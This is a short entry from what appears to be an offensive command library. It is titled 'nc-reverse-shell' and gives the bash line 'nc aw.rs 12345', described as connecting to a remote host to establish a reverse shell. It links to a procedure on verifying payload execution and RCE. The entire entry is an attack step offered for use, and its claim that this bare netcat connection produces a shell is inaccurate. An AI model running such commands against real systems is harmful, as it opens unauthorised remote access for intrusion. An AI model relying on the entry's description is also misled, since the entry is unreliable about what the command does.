---
id: 7748f1e5-0379-435c-b00b-5cfcf576c119
name: nc-reverse-shell
type: command
executor: bash
data: nc aw.rs 12345
output: null
created_at: '2025-12-11T06:10:13.211Z'
updated_at: '2025-12-11T06:10:13.211Z'
platforms:
  - Linux
tags:
  - reverse-shell
  - nc
verified: false
validated: true
submitted: true
---

# nc-reverse-shell

## Command

```bash
nc aw.rs 12345
```

## Description

Connects to a remote server for establishing a reverse shell.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| aw.rs | Domain | Yes |
| 12345 | Port | Yes |

## Examples

### Basic Usage

```bash
nc aw.rs 12345
```

## Expected Output

Shell connection

## Related

- [[commands/exit]]
- [[procedures/Verify-Payload-Execution-and-RCE]]
